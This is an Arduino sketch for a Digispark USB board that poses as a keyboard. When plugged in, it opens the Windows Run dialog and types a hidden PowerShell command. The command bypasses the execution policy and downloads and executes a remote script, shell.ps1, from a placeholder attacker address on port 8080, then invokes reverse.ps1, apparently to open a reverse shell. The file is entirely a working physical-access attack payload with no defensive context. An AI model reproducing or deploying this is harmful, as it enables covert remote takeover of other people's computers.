#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
  delay(100);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(200);
  DigiKeyboard.print("powershell.exe -executionpolicy bypass -w hidden \"IEX (New-Object System.Net.WebClient).DownloadString('http://IP-ADRESİ:8080/shell.ps1'); reverse.ps1;\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {

}
